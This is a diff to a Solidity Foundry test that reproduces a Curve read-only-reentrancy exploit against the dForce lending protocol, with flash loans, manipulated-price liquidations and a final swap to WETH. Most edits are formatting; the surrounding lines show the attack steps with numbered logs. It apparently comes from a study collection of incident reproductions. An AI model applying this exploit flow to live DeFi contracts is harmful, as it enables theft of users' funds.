@@ -24,7 +24,10 @@ interface IVWSTETHCRVGAUGE is IERC20 {
 }
 
 interface ICurvePools is ICurvePool {
-    function remove_liquidity(uint256 token_amount, uint256[2] memory min_amounts) external;
+    function remove_liquidity(
+        uint256 token_amount,
+        uint256[2] memory min_amounts
+    ) external returns (uint256[2] memory);
 }
 
 interface IDForce {
@@ -119,13 +122,13 @@ contract ContractTest is Test {
             "19.swap the USX token to USDC, and swap USDC to WETH, the USDC amount",
             USDC.balanceOf(address(this)),
             USDC.decimals()
-            );
+        );
         USDC.transfer(address(GMXVault), USDC.balanceOf(address(this)));
         GMXVault.swap(address(USDC), address(WETH), address(this));
 
         emit log_named_decimal_uint(
             "20.Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
-            );
+        );
     }
     // 1.balancerFlashloan
 
@@ -276,7 +279,7 @@ contract ContractTest is Test {
         console.log("--------------------------------------------------");
         emit log_named_decimal_uint(
             "10.SwapFlashLoan callback, add liquidity to curve, the ETH amount", ETHBalance, WETH.decimals()
-            );
+        );
         uint256 LPAmount = curvePool.add_liquidity{value: ETHBalance}([ETHBalance, 0], 0);
         USX.approve(address(dForceContract), type(uint256).max);
         USX.approve(address(VWSTETHCRVGAUGE), type(uint256).max);
@@ -285,7 +288,7 @@ contract ContractTest is Test {
             "11.Transfer wstETHCRV token to exploiter's borrower, token amount",
             1_904_761_904_761_904_761_904,
             WSTETHCRV.decimals()
-            );
+        );
         WSTETHCRV.transfer(address(borrower), 1_904_761_904_761_904_761_904);
         borrower.exec();
         uint256 burnAmount = 63_438_591_176_197_540_597_712;
@@ -293,7 +296,7 @@ contract ContractTest is Test {
             "14.Remove liquidity from curve, before reentrancy, the price of VWSTETHCRVGAUGE",
             PriceOracle.getUnderlyingPrice(address(VWSTETHCRVGAUGE)),
             VWSTETHCRVGAUGE.decimals()
-            );
+        );
         curvePool.remove_liquidity(burnAmount, [uint256(0), uint256(0)]); // curve read-only-reentrancy
         burnAmount = 2_924_339_222_027_299_635_899;
         curvePool.remove_liquidity(burnAmount, [uint256(0), uint256(0)]);
@@ -309,14 +312,14 @@ contract ContractTest is Test {
                 "15.In reentrancy, the price of VWSTETHCRVGAUGE",
                 PriceOracle.getUnderlyingPrice(address(VWSTETHCRVGAUGE)),
                 VWSTETHCRVGAUGE.decimals()
-                );
+            );
             uint256 borrowAmount = dForceContract.borrowBalanceStored(address(borrower));
             uint256 Multiplier = cointroller.closeFactorMantissa();
             emit log_named_decimal_uint(
                 "16.liquidate the exploiter's borrower, the borrowAmount of exploiter",
                 borrowAmount,
                 VWSTETHCRVGAUGE.decimals()
-                );
+            );
             cointroller.liquidateCalculateSeizeTokens(
                 address(dForceContract), address(VWSTETHCRVGAUGE), borrowAmount * Multiplier / 1e18
             );
@@ -326,7 +329,7 @@ contract ContractTest is Test {
                 "17.liquidate the victim's borrower, the borrowAmount of victim",
                 borrowAmount,
                 VWSTETHCRVGAUGE.decimals()
-                );
+            );
             console.log("--------------------------------------------------");
             cointroller.liquidateCalculateSeizeTokens(
                 address(dForceContract), address(VWSTETHCRVGAUGE), borrowAmount * Multiplier / 1e18
@@ -337,7 +340,7 @@ contract ContractTest is Test {
                 "18.redeem vwstETHCRV-gauge to wstETHCRV-gauge and withdraw wstETHCRV, the token amount",
                 WSTETHCRVGAUGE.balanceOf(address(this)),
                 WSTETHCRVGAUGE.decimals()
-                );
+            );
             WSTETHCRVGAUGE.withdraw(WSTETHCRVGAUGE.balanceOf(address(this)));
         }
     }
@@ -352,7 +355,7 @@ contract Borrower is Test {
     function exec() external {
         emit log_named_decimal_uint(
             "12.deposit wstETHCRV to wstETHCRV-gauge, token amount", 1_904_761_904_761_904_761_904, WSTETHCRV.decimals()
-            );
+        );
         WSTETHCRV.approve(address(WSTETHCRVGAUGE), type(uint256).max);
         uint256 depositAmount = 1_904_761_904_761_904_761_904;
         address(WSTETHCRVGAUGE).call(abi.encodeWithSignature("deposit(uint256)", depositAmount));
@@ -367,7 +370,7 @@ contract Borrower is Test {
             "13.deposit wstETHCRV-gauge to dForce, receive USX token, the token amount",
             USX.balanceOf(address(this)),
             USX.decimals()
-            );
+        );
         USX.transfer(msg.sender, USX.balanceOf(address(this)));
         console.log("--------------------------------------------------");
     }
